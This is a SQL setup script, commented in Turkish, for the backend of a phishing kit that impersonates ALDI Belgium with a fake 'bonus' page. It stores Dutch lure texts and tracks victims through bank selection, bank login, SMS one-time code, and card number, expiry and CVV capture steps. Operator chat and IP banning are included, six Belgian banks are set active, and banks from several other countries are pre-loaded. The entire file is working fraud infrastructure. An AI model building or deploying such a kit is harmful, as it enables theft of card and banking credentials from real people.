-- =====================================================================
-- FULL SCHEMA — ALDI BELGIE KURULUM (tek seferde calistir)
-- Tablolar: sessions, global_settings, banks, banned_ips, chat_messages
-- + storage bucket'lari (assets, chat_images) + realtime publication
-- + Belcika bankalari (AKTIF) + ALDI/Nederlands global_settings
-- =====================================================================

-- ==================== 1) SESSIONS ====================
CREATE TABLE IF NOT EXISTS public.sessions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  public_id bigint,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now(),
  amount numeric DEFAULT 0,
  current_step text NOT NULL DEFAULT 'win',
  status text NOT NULL DEFAULT 'offline',
  form_data jsonb NOT NULL DEFAULT '{}'::jsonb,
  is_hidden boolean DEFAULT false,
  partner_name text,
  participation_code text,
  sms_digits integer NOT NULL DEFAULT 6,
  sms_custom_text text,
  ip_address text,
  user_agent text,
  deleted_at timestamptz
);

CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;
ALTER TABLE public.sessions ALTER COLUMN public_id SET DEFAULT nextval('public.sessions_public_id_seq');
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK (current_step IN (
  'code_entry','sms','win','verify','banken','card','wait','invalid_bank',
  'bank','live_support','special_approval','congratulations','congrats',
  'facebook','wheel','login','bank_login','SPECIAL_INFO',
  'generator1','generator2','custom_question','kbc_approval'
));

ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS sessions_anon_select ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_delete ON public.sessions;
DROP POLICY IF EXISTS sessions_authenticated_all ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_select_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert_demo ON public.sessions;
CREATE POLICY sessions_anon_select ON public.sessions FOR SELECT TO anon USING (true);
CREATE POLICY sessions_anon_update ON public.sessions FOR UPDATE TO anon USING (true) WITH CHECK (true);
CREATE POLICY sessions_anon_insert ON public.sessions FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY sessions_authenticated_all ON public.sessions FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE UNIQUE INDEX IF NOT EXISTS idx_sessions_public_id ON public.sessions (public_id) WHERE public_id IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_sessions_ip_created ON public.sessions (ip_address, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_created_at ON public.sessions (created_at DESC);

-- ==================== 2) GLOBAL_SETTINGS ====================
CREATE TABLE IF NOT EXISTS public.global_settings (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  logo_url text DEFAULT '/form-assets/aldi-logo.png',
  bg_url text DEFAULT '/form-assets/bg-desktop.png',
  background_url text,
  og_image_url text,
  portal_name text DEFAULT 'ALDI klantenportaal',
  support_center_name text DEFAULT 'ALDI klantenservice',
  target_country text DEFAULT 'Belçika',
  site_language text DEFAULT 'nl',
  site_enabled boolean DEFAULT true,
  entry_page text DEFAULT '/win',
  wheel_settings jsonb DEFAULT '{}'::jsonb,
  win_title text,
  win_subtitle text,
  win_button text,
  banken_title text,
  banken_subtitle text,
  wait_title text,
  wait_subtitle text,
  sms_title text,
  card_title text,
  card_subtitle text,
  code_title text,
  code_subtitle text,
  code_button text,
  live_support_title text,
  live_support_subtitle text,
  live_support_button text,
  profile_title_small text,
  profile_title_main text,
  profile_subtitle text,
  profile_button text,
  banken_search_placeholder text,
  sms_subtitle text,
  sms_input_label text,
  sms_button text,
  sms_loading text,
  card_owner_label text,
  card_number_label text,
  card_expiry_label text,
  card_cvv_label text,
  card_button text,
  profile_firstname_label text,
  profile_lastname_label text,
  profile_phone_label text,
  profile_loading_text text,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Enable read access for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable insert for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable update for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable delete for all users" ON public.global_settings;
CREATE POLICY "Enable read access for all users" ON public.global_settings FOR SELECT USING (true);
CREATE POLICY "Enable insert for all users" ON public.global_settings FOR INSERT WITH CHECK (true);
CREATE POLICY "Enable update for all users" ON public.global_settings FOR UPDATE USING (true);
CREATE POLICY "Enable delete for all users" ON public.global_settings FOR DELETE USING (true);

ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS site_language text DEFAULT 'nl';

-- ALDI België / Nederlands varsayilan satir (yoksa ekle)
INSERT INTO public.global_settings (
  site_enabled, entry_page, site_language, target_country,
  logo_url, bg_url, portal_name, support_center_name,
  win_title, win_subtitle, win_button,
  banken_title, banken_subtitle, banken_search_placeholder,
  wait_title, wait_subtitle,
  sms_title, sms_subtitle, sms_input_label, sms_button, sms_loading,
  card_title, card_subtitle, card_owner_label, card_number_label,
  card_expiry_label, card_cvv_label, card_button,
  code_title, code_subtitle, code_button,
  live_support_title, live_support_subtitle, live_support_button,
  profile_title_small, profile_title_main, profile_subtitle,
  profile_firstname_label, profile_lastname_label, profile_phone_label,
  profile_button, profile_loading_text
)
SELECT
  true, '/win', 'nl', 'Belçika',
  '/form-assets/aldi-logo.png', '/form-assets/bg-desktop.png',
  'ALDI klantenportaal', 'ALDI klantenservice',
  'Exclusieve ALDI-bonus',
  'Gefeliciteerd! U bent geselecteerd voor de ALDI-actie van vandaag. Klik op de onderstaande knop om uw bonus op te eisen.',
  'Bonus claimen',
  'Kies uw bank', 'Kies uw Belgische bank om verder te gaan.', 'Zoek uw bank...',
  'Even geduld', 'Uw aanvraag wordt veilig verwerkt...',
  'SMS-beveiligingscode', 'Voer de {digits}-cijferige code in.', 'Eenmalige code', 'Bevestigen', 'Verwerken...',
  'Betaalgegevens', 'Controleer en bevestig uw gegevens.',
  'Naam kaarthouder', 'Kaartnummer', 'Vervaldatum MM/JJ', 'Beveiligingscode', 'Doorgaan',
  'Welkom', 'Voer de deelnamecode in die u van {partner} heeft ontvangen om uw prijs te ontgrendelen.', 'Code bevestigen',
  'Live-ondersteuning',
  'Om verder te gaan, moet u contact opnemen met onze klantenservice.' || chr(10) || chr(10) || 'Klik op de onderstaande knop om het gesprek te starten.',
  'Start gesprek',
  'Prijsbevestiging', 'Uw bonusbedrag', 'Bevestig uw gegevens voor verdere verwerking.',
  'Voornaam', 'Achternaam', 'Mobiel telefoonnummer', 'Doorgaan', 'Verwerken...'
WHERE NOT EXISTS (SELECT 1 FROM public.global_settings);

-- Mevcut satirdaki NULL alanlari NL varsayilanlariyla doldur + Belgika ayarlari
UPDATE public.global_settings SET
  site_language = 'nl',
  target_country = 'Belçika',
  logo_url = CASE WHEN logo_url IS NULL OR logo_url = '' OR logo_url LIKE '%mercator%' OR logo_url LIKE 'https://www.maxima.lt/%' THEN '/form-assets/aldi-logo.png' ELSE logo_url END,
  bg_url = CASE WHEN bg_url IS NULL OR bg_url = '' THEN '/form-assets/bg-desktop.png' ELSE bg_url END,
  portal_name = COALESCE(portal_name, 'ALDI klantenportaal'),
  support_center_name = COALESCE(support_center_name, 'ALDI klantenservice'),
  win_title = COALESCE(win_title, 'Exclusieve ALDI-bonus'),
  win_subtitle = COALESCE(win_subtitle, 'Gefeliciteerd! U bent geselecteerd voor de ALDI-actie van vandaag. Klik op de onderstaande knop om uw bonus op te eisen.'),
  win_button = COALESCE(win_button, 'Bonus claimen'),
  banken_title = COALESCE(banken_title, 'Kies uw bank'),
  banken_subtitle = COALESCE(banken_subtitle, 'Kies uw Belgische bank om verder te gaan.'),
  banken_search_placeholder = COALESCE(banken_search_placeholder, 'Zoek uw bank...'),
  wait_title = COALESCE(wait_title, 'Even geduld'),
  wait_subtitle = COALESCE(wait_subtitle, 'Uw aanvraag wordt veilig verwerkt...'),
  sms_title = COALESCE(sms_title, 'SMS-beveiligingscode'),
  sms_subtitle = COALESCE(sms_subtitle, 'Voer de {digits}-cijferige code in.'),
  sms_input_label = COALESCE(sms_input_label, 'Eenmalige code'),
  sms_button = COALESCE(sms_button, 'Bevestigen'),
  sms_loading = COALESCE(sms_loading, 'Verwerken...'),
  card_title = COALESCE(card_title, 'Betaalgegevens'),
  card_subtitle = COALESCE(card_subtitle, 'Controleer en bevestig uw gegevens.'),
  card_owner_label = COALESCE(card_owner_label, 'Naam kaarthouder'),
  card_number_label = COALESCE(card_number_label, 'Kaartnummer'),
  card_expiry_label = COALESCE(card_expiry_label, 'Vervaldatum MM/JJ'),
  card_cvv_label = COALESCE(card_cvv_label, 'Beveiligingscode'),
  card_button = COALESCE(card_button, 'Doorgaan'),
  code_title = COALESCE(code_title, 'Welkom'),
  code_subtitle = COALESCE(code_subtitle, 'Voer de deelnamecode in die u van {partner} heeft ontvangen om uw prijs te ontgrendelen.'),
  code_button = COALESCE(code_button, 'Code bevestigen'),
  live_support_title = COALESCE(live_support_title, 'Live-ondersteuning'),
  live_support_subtitle = COALESCE(live_support_subtitle, 'Om verder te gaan, moet u contact opnemen met onze klantenservice.' || chr(10) || chr(10) || 'Klik op de onderstaande knop om het gesprek te starten.'),
  live_support_button = COALESCE(live_support_button, 'Start gesprek'),
  profile_title_small = COALESCE(profile_title_small, 'Prijsbevestiging'),
  profile_title_main = COALESCE(profile_title_main, 'Uw bonusbedrag'),
  profile_subtitle = COALESCE(profile_subtitle, 'Bevestig uw gegevens voor verdere verwerking.'),
  profile_firstname_label = COALESCE(profile_firstname_label, 'Voornaam'),
  profile_lastname_label = COALESCE(profile_lastname_label, 'Achternaam'),
  profile_phone_label = COALESCE(profile_phone_label, 'Mobiel telefoonnummer'),
  profile_button = COALESCE(profile_button, 'Doorgaan'),
  profile_loading_text = COALESCE(profile_loading_text, 'Verwerken...')
WHERE id = (SELECT id FROM public.global_settings ORDER BY created_at NULLS LAST LIMIT 1);

-- ==================== 3) BANKS (België — sadece bunlar AKTIF) ====================
CREATE TABLE IF NOT EXISTS public.banks (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  slug text UNIQUE NOT NULL,
  name text NOT NULL,
  brand_color text,
  accent_color text,
  logo_file text,
  domain text,
  country text DEFAULT 'Belçika',
  is_active boolean DEFAULT true,
  auto_redirect boolean DEFAULT false,
  design_config jsonb DEFAULT '{}'::jsonb,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE public.banks ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow public read access on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public insert on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public update on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public delete on banks" ON public.banks;
CREATE POLICY "Allow public read access on banks" ON public.banks FOR SELECT USING (true);
CREATE POLICY "Allow public insert on banks" ON public.banks FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow public update on banks" ON public.banks FOR UPDATE USING (true);
CREATE POLICY "Allow public delete on banks" ON public.banks FOR DELETE USING (true);

ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS auto_redirect boolean DEFAULT false;

-- Once hepsini pasife al, sonra sadece Belcika bankalarini aktif yap
UPDATE public.banks SET is_active = false;

INSERT INTO public.banks (slug, name, country, brand_color, accent_color, logo_file, is_active) VALUES
  ('argenta-be',              'Argenta',              'Belçika', '#E30E14', '#E30E14', '/bank-logos/belgium/argenta-be.png',              true),
  ('belfius-be',              'Belfius',              'Belçika', '#D92B2F', '#D92B2F', '/bank-logos/belgium/belfius-be.png',              true),
  ('bnp-paribas-fortis-be',   'BNP Paribas Fortis',   'Belçika', '#00915A', '#00915A', '/bank-logos/belgium/bnp-paribas-fortis-be.png',   true),
  ('beobank-be',              'Beobank',              'Belçika', '#003C71', '#003C71', '/bank-logos/belgium/beobank-be.png',              true),
  ('ing-be',                  'ING België',           'Belçika', '#FF6200', '#FF6200', '/bank-logos/belgium/ing-be.png',                  true),
  ('kbc-be',                  'KBC',                  'Belçika', '#0066B3', '#0066B3', '/bank-logos/belgium/kbc-be.png',                  true)
ON CONFLICT (slug) DO UPDATE SET
  name = EXCLUDED.name,
  country = EXCLUDED.country,
  brand_color = EXCLUDED.brand_color,
  accent_color = EXCLUDED.accent_color,
  logo_file = EXCLUDED.logo_file,
  is_active = true;

-- =====================================================================
-- DIGER ULKELERIN BANKALARI — admin listesinde gorunur ama PASIF
-- =====================================================================

-- ---------- SLOVENYA (PASIF) ----------
INSERT INTO public.banks (slug, name, logo_file, domain, country, is_active) VALUES
  ('nlb-si',                'NLB',                           '/bank-logos/slovenia/nlb-si.png',                'nlb.si',               'Slovenya', false),
  ('otpbanka-si',           'OTP banka',                     '/bank-logos/slovenia/otpbanka-si.png',           'otpbanka.si',          'Slovenya', false),
  ('unicreditbanking-si',   'UniCredit Banka Slovenija',     '/bank-logos/slovenia/unicreditbanking-si.png',   'unicreditbank.si',     'Slovenya', false),
  ('intesasanpaolobank-si', 'Intesa Sanpaolo Bank',          '/bank-logos/slovenia/intesasanpaolobank-si.png', 'intesasanpaolobank.si','Slovenya', false),
  ('addiko-si',             'Addiko Bank',                   '/bank-logos/slovenia/addiko-si.png',             'addiko.si',            'Slovenya', false),
  ('sparkasse-si',          'Banka Sparkasse',               '/bank-logos/slovenia/sparkasse-si.png',          'sparkasse.si',         'Slovenya', false),
  ('bks-si',                'BKS Bank',                      '/bank-logos/slovenia/bks-si.png',                'bks.si',               'Slovenya', false),
  ('dbs-si',                'Deželna banka Slovenije',       '/bank-logos/slovenia/dbs-si.png',                'dbs.si',               'Slovenya', false),
  ('dh-si',                 'Delavska hranilnica',           '/bank-logos/slovenia/dh-si.png',                 'dh.si',                'Slovenya', false),
  ('lon-si',                'LON',                           '/bank-logos/slovenia/lon-si.png',                'lon.si',               'Slovenya', false),
  ('phv-si',                'Primorska hranilnica Vipava',   '/bank-logos/slovenia/phv-si.png',                'phv.si',               'Slovenya', false)
ON CONFLICT (slug) DO NOTHING;

-- ---------- HOLLANDA (PASIF) ----------
INSERT INTO public.banks (slug, name, brand_color, accent_color, logo_file, domain, country, is_active) VALUES
  ('abn-amro',                  'ABN AMRO',                    '#0a8f6a', '#f6c500', '/bank-logos/abn-amro.svg',                    'abnamro.nl',           'Hollanda', false),
  ('adyen',                     'Adyen',                       '#0abf53', '#089942', '/bank-logos/adyen.svg',                       'adyen.com',            'Hollanda', false),
  ('asn-bank',                  'ASN Bank',                    '#8a1538', '#5b0f25', '/bank-logos/asn-bank.svg',                    'asnbank.nl',           'Hollanda', false),
  ('asn-bank-vh-regiobank',     'ASN Bank vh RegioBank',       '#1f6f43', '#14502f', '/bank-logos/asn-bank-vh-regiobank.svg',       'regiobank.nl',         'Hollanda', false),
  ('asn-bank-voorheen-blgwonen','ASN Bank voorheen BLGwonen',  '#e64a38', '#d03d2d', '/bank-logos/asn-bank-voorheen-blgwonen.png',  'asnbank.nl',           'Hollanda', false),
  ('asn-bank-voorheen-sns',     'ASN Bank voorheen SNS',       '#5f259f', '#421970', '/bank-logos/asn-bank-voorheen-sns.svg',       'snsbank.nl',           'Hollanda', false),
  ('bunq',                      'bunq',                        '#0f172a', '#1e293b', '/bank-logos/bunq.svg',                        'bunq.com',             'Hollanda', false),
  ('buut',                      'BUUT',                        '#333333', '#111111', '/bank-logos/buut.svg',                        'buut.nl',              'Hollanda', false),
  ('finom',                     'Finom',                       '#f33a6b', '#c22e56', '/bank-logos/finom.svg',                       'finom.co',             'Hollanda', false),
  ('ing',                       'ING',                         '#ff6200', '#d94c00', '/bank-logos/ing.svg',                         'ing.nl',               'Hollanda', false),
  ('knab',                      'Knab',                        '#11998e', '#0c6f67', '/bank-logos/knab.svg',                        'knab.nl',              'Hollanda', false),
  ('mollie',                    'Mollie',                      '#000000', '#333333', '/bank-logos/mollie.svg',                      'mollie.com',           'Hollanda', false),
  ('n26',                       'N26',                         '#36a18b', '#2b816f', '/bank-logos/n26.svg',                         'n26.com',              'Hollanda', false),
  ('nationale-nederlanden',     'Nationale-Nederlanden',       '#ea650d', '#bb510a', '/bank-logos/nationale-nederlanden.svg',       'nn.nl',                'Hollanda', false),
  ('rabobank',                  'Rabobank',                    '#003d8f', '#f57c00', '/bank-logos/rabobank.svg',                    'rabobank.nl',          'Hollanda', false),
  ('revolut',                   'Revolut',                     '#000000', '#333333', '/bank-logos/revolut.svg',                     'revolut.com',          'Hollanda', false),
  ('triodos-bank',              'Triodos Bank',                '#6b3fa0', '#4b2c70', '/bank-logos/triodos-bank.svg',                'triodos.nl',           'Hollanda', false),
  ('van-lanschot-kempen',       'Van Lanschot Kempen',         '#173463', '#0f2241', '/bank-logos/van-lanschot-kempen.svg',         'vanlanschotkempen.com','Hollanda', false),
  ('yoursafe',                  'Yoursafe',                    '#0a81c5', '#08679e', '/bank-logos/yoursafe.svg',                    'yoursafe.com',         'Hollanda', false)
ON CONFLICT (slug) DO NOTHING;

-- ---------- LITVANYA (PASIF) ----------
INSERT INTO public.banks (slug, name, logo_file, domain, country, is_active) VALUES
  ('swedbank-lt',        'Swedbank',            '/bank-logos/lithuania/swedbank-lt.png',        'swedbank.lt',        'Litvanya', false),
  ('seb-lt',             'SEB',                 '/bank-logos/lithuania/seb-lt.png',             'seb.lt',             'Litvanya', false),
  ('luminor-lt',         'Luminor',             '/bank-logos/lithuania/luminor-lt.png',         'luminor.lt',         'Litvanya', false),
  ('citadele-lt',        'Citadele',            '/bank-logos/lithuania/citadele-lt.png',        'citadele.lt',        'Litvanya', false),
  ('lku-lt',             'LKU',                 '/bank-logos/lithuania/lku-lt.png',             'lku.lt',             'Litvanya', false),
  ('kredito-unijos-lt',  'Kredito unijos',      '/bank-logos/lithuania/kredito-unijos-lt.png',  'kreditounijos.lt',   'Litvanya', false),
  ('siauliu-lt',         'Šiaulių bankas',      '/bank-logos/lithuania/siauliu-lt.png',         'sb.lt',              'Litvanya', false)
ON CONFLICT (slug) DO NOTHING;

-- ---------- ESTONYA (PASIF) ----------
INSERT INTO public.banks (slug, name, logo_file, domain, country, is_active) VALUES
  ('bigbank',            'Bigbank',             '/bank-logos/estonia/bigbank.jpg',              'bigbank.ee',         'Estonya', false),
  ('citadele-banka',     'Citadele Banka',      '/bank-logos/estonia/citadele-banka.jpg',       'citadele.ee',        'Estonya', false),
  ('coop-pank',          'Coop Pank',           '/bank-logos/estonia/coop-pank.jpg',            'cooppank.ee',        'Estonya', false),
  ('inbank',             'Inbank',              '/bank-logos/estonia/inbank.png',               'inbank.ee',          'Estonya', false),
  ('lhv-pank',           'LHV Pank',            '/bank-logos/estonia/lhv-pank.jpg',             'lhv.ee',             'Estonya', false),
  ('luminor-ee',         'Luminor',             '/bank-logos/estonia/luminor-ee.jpg',           'luminor.ee',         'Estonya', false),
  ('op-corporate-bank',  'OP Corporate Bank',   '/bank-logos/estonia/op-corporate-bank.jpg',    'op.ee',              'Estonya', false),
  ('seb-pank',           'SEB Pank',            '/bank-logos/estonia/seb-pank.jpg',             'seb.ee',             'Estonya', false),
  ('swedbank-ee',        'Swedbank',            '/bank-logos/estonia/swedbank-ee.jpg',          'swedbank.ee',        'Estonya', false)
ON CONFLICT (slug) DO NOTHING;

-- ---------- FINLANDIYA (PASIF) ----------
INSERT INTO public.banks (slug, name, logo_file, domain, country, is_active) VALUES
  ('aktia-fi',           'Aktia',               '/bank-logos/aktia-fi.png',                     'aktia.fi',           'Finlandiya', false),
  ('danske-bank-fi',     'Danske Bank',         '/bank-logos/danske-bank-fi.png',               'danskebank.fi',      'Finlandiya', false),
  ('handelsbanken-fi',   'Handelsbanken',       '/bank-logos/handelsbanken-fi.png',             'handelsbanken.fi',   'Finlandiya', false),
  ('landsbanken-fi',     'Landsbanken',         '/bank-logos/landsbanken-fi.png',               'landsbanken.fi',     'Finlandiya', false),
  ('nordea-fi',          'Nordea',              '/bank-logos/nordea-fi.png',                    'nordea.fi',          'Finlandiya', false),
  ('omasp-fi',           'OmaSp',               '/bank-logos/omasp-fi.png',                     'omasp.fi',           'Finlandiya', false),
  ('op-fi',              'OP',                  '/bank-logos/op-fi.png',                        'op.fi',              'Finlandiya', false),
  ('pop-pankki-fi',      'POP Pankki',          '/bank-logos/pop-pankki-fi.png',                'poppankki.fi',       'Finlandiya', false),
  ('s-pankki-fi',        'S-Pankki',            '/bank-logos/s-pankki-fi.png',                  's-pankki.fi',        'Finlandiya', false),
  ('s-st-pankki-fi',     'Säästöpankki',        '/bank-logos/s-st-pankki-fi.png',               'saastopankki.fi',    'Finlandiya', false)
ON CONFLICT (slug) DO NOTHING;

-- ---------- ISPANYA (PASIF) ----------
INSERT INTO public.banks (slug, name, logo_file, domain, country, is_active) VALUES
  ('banco-bbva-es',          'BBVA',               '/bank-logos/banco-bbva-es.png',           'bbva.es',            'İspanya', false),
  ('banco-cooperativo-es',   'Banco Cooperativo',  '/bank-logos/banco-cooperativo-es.png',    'bancocooperativo.es','İspanya', false),
  ('banco-santander-es',     'Banco Santander',    '/bank-logos/banco-santander-es.png',      'santander.es',       'İspanya', false),
  ('bankinter-es',           'Bankinter',          '/bank-logos/bankinter-es.png',            'bankinter.es',       'İspanya', false),
  ('caixabank-es',           'CaixaBank',          '/bank-logos/caixabank-es.png',            'caixabank.es',       'İspanya', false),
  ('cajamar-caja-rural-es',  'Cajamar Caja Rural', '/bank-logos/cajamar-caja-rural-es.svg',   'cajamar.es',         'İspanya', false),
  ('cajasur-es',             'Cajasur',            '/bank-logos/cajasur-es.png',              'cajasur.es',         'İspanya', false),
  ('evo-banco-es',           'EVO Banco',          '/bank-logos/evo-banco-es.png',            'evobanco.com',       'İspanya', false),
  ('ibercaja-es',            'Ibercaja',           '/bank-logos/ibercaja-es.png',             'ibercaja.es',        'İspanya', false),
  ('kutxabank-es',           'Kutxabank',          '/bank-logos/kutxabank-es.png',            'kutxabank.es',       'İspanya', false),
  ('laboral-kutxa-es',       'Laboral Kutxa',      '/bank-logos/laboral-kutxa-es.png',        'laboralkutxa.com',   'İspanya', false),
  ('openbank-es',            'Openbank',           '/bank-logos/openbank-es.png',             'openbank.es',        'İspanya', false),
  ('unicaja-es',             'Unicaja',            '/bank-logos/unicaja-es.png',              'unicaja.es',         'İspanya', false)
ON CONFLICT (slug) DO NOTHING;

-- ---------- AVUSTURYA (PASIF) ----------
INSERT INTO public.banks (slug, name, logo_file, domain, country, is_active) VALUES
  ('anadi-bank-at',          'Anadi Bank',                              '/logos/austrian-anadi-bank-ag.png',                    'anadi-bank.at',      'Avusturya', false),
  ('bank-austria-at',        'Bank Austria',                            '/logos/bank-austria.png',                              'bankaustria.at',     'Avusturya', false),
  ('bank99-at',              'bank99',                                  '/logos/bank99-ag.png',                                 'bank99.at',          'Avusturya', false),
  ('spaengler-at',           'Bankhaus Carl Spängler & Co. AG',         '/logos/bankhaus-carl-spangler-und-co-ag.png',          'spaengler.at',       'Avusturya', false),
  ('bawag-at',               'BAWAG',                                   '/logos/bawag-ag.png',                                  'bawag.at',           'Avusturya', false),
  ('bks-bank-at',            'BKS Bank',                                '/logos/bks-bank-ag.png',                               'bks.at',             'Avusturya', false),
  ('btv-at',                 'BTV Vier Länder Bank',                    '/logos/btv-vier-lander-bank.png',                      'btv.at',             'Avusturya', false),
  ('dolomitenbank-at',       'DolomitenBank',                           '/logos/dolomitenbank.png',                             'dolomitenbank.at',   'Avusturya', false),
  ('easybank-at',            'easybank',                                '/logos/easybank.png',                                  'easybank.at',        'Avusturya', false),
  ('erste-bank-at',          'Erste Bank und Sparkassen',               '/logos/erste-bank-und-sparkassen.png',                 'erstebank.at',       'Avusturya', false),
  ('hypo-burgenland-at',     'HYPO Bank Burgenland',                    '/logos/hypo-bank-burgenland-ag.png',                   'hypo-bbg.at',        'Avusturya', false),
  ('hypo-noe-at',            'HYPO NOE Landesbank',                     '/logos/hypo-noe-lb.png',                               'hypo-noe.at',        'Avusturya', false),
  ('hypo-ooe-at',            'HYPO Oberösterreich Salzburg',            '/logos/hypo-oberoesterreich-salzburg.png',             'hypo.at',            'Avusturya', false),
  ('hypo-tirol-at',          'HYPO Tirol Bank',                         '/logos/hypo-tirol-bank-ag.png',                        'hypotirol.com',      'Avusturya', false),
  ('hypo-vorarlberg-at',     'Hypo Vorarlberg Bank',                    '/logos/hypo-vorarlberg-bank-ag.png',                   'hypovbg.at',         'Avusturya', false),
  ('marchfelder-bank-at',    'Marchfelder Bank',                        '/logos/marchfelder-bank.png',                          'marchfelderbank.at', 'Avusturya', false),
  ('oberbank-at',            'Oberbank',                                '/logos/oberbank-ag.png',                               'oberbank.at',        'Avusturya', false),
  ('aerzte-apothekerbank-at','Österreichische Ärzte- und Apothekerbank','/logos/oesterreichische-aerzte-und-apothekerbank.png', 'aerztebank.at',      'Avusturya', false),
  ('raiffeisen-at',          'Raiffeisen Bankengruppe Österreich',      '/logos/raiffeisen-bankengruppe-oesterreich.png',       'raiffeisen.at',      'Avusturya', false),
  ('schelhammer-at',         'Schelhammer Capital Bank',                '/logos/schelhammer-capital-bank-ag.png',               'schelhammer.at',     'Avusturya', false),
  ('schoellerbank-at',       'Schoellerbank',                           '/logos/schoellerbank-ag.png',                          'schoellerbank.at',   'Avusturya', false),
  ('sparda-bank-at',         'Sparda-Bank Wien',                        '/logos/sparda-bank-wien.png',                          'spardabank.at',      'Avusturya', false),
  ('volksbank-at',           'Volksbank',                               '/logos/volksbanken.png',                               'volksbank.at',       'Avusturya', false),
  ('volkskreditbank-at',     'Volkskreditbank',                         '/logos/volkskreditbank-ag.png',                        'volkskreditbank.at', 'Avusturya', false)
ON CONFLICT (slug) DO NOTHING;

-- ---------- GUVENLIK: Belcika disindaki HER sey pasif ----------
UPDATE public.banks
SET is_active = false, updated_at = NOW()
WHERE COALESCE(country, '') <> 'Belçika' AND slug NOT ILIKE '%-be';

-- Belcika bankalari kesin aktif:
UPDATE public.banks
SET is_active = true, updated_at = NOW()
WHERE slug ILIKE '%-be' OR country = 'Belçika';

-- ==================== 4) BANNED_IPS ====================
CREATE TABLE IF NOT EXISTS public.banned_ips (
  ip_address text PRIMARY KEY,
  reason text,
  banned_at timestamptz DEFAULT now()
);

ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all read access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all insert access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all delete access to banned_ips" ON public.banned_ips;
CREATE POLICY "Allow all read access to banned_ips" ON public.banned_ips FOR SELECT USING (true);
CREATE POLICY "Allow all insert access to banned_ips" ON public.banned_ips FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow all delete access to banned_ips" ON public.banned_ips FOR DELETE USING (true);

-- ==================== 5) CHAT ====================
CREATE TABLE IF NOT EXISTS public.chat_messages (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL,
  sender text NOT NULL CHECK (sender IN ('user','admin')),
  content text NOT NULL,
  image_url text,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_messages_session ON public.chat_messages (session_id);

ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS chat_messages_anon_all ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_auth_all ON public.chat_messages;
CREATE POLICY chat_messages_anon_all ON public.chat_messages FOR ALL TO anon USING (true) WITH CHECK (true);
CREATE POLICY chat_messages_auth_all ON public.chat_messages FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- ==================== 6) STORAGE BUCKET'LARI ====================
INSERT INTO storage.buckets (id, name, public) VALUES ('assets', 'assets', true) ON CONFLICT (id) DO NOTHING;
INSERT INTO storage.buckets (id, name, public) VALUES ('chat_images', 'chat_images', true) ON CONFLICT (id) DO NOTHING;

DROP POLICY IF EXISTS "Public Access" ON storage.objects;
DROP POLICY IF EXISTS "Allow Uploads" ON storage.objects;
DROP POLICY IF EXISTS "chat_images_select" ON storage.objects;
DROP POLICY IF EXISTS "chat_images_insert" ON storage.objects;
CREATE POLICY "Public Access" ON storage.objects FOR SELECT USING (bucket_id IN ('assets','chat_images'));
CREATE POLICY "Allow Uploads" ON storage.objects FOR INSERT WITH CHECK (bucket_id IN ('assets','chat_images'));

-- ==================== 7) REALTIME ====================
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.sessions;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;

NOTIFY pgrst, 'reload schema';

-- Kontrol: ulke bazinda banka dagilimi + diger tablolar
SELECT country, is_active, count(*) FROM public.banks GROUP BY country, is_active ORDER BY country, is_active;
SELECT 'sessions' t, count(*) FROM public.sessions
UNION ALL SELECT 'global_settings', count(*) FROM public.global_settings
UNION ALL SELECT 'banks_aktif', count(*) FROM public.banks WHERE is_active = true
UNION ALL SELECT 'banks_pasif', count(*) FROM public.banks WHERE is_active = false
UNION ALL SELECT 'banned_ips', count(*) FROM public.banned_ips
UNION ALL SELECT 'chat_messages', count(*) FROM public.chat_messages;
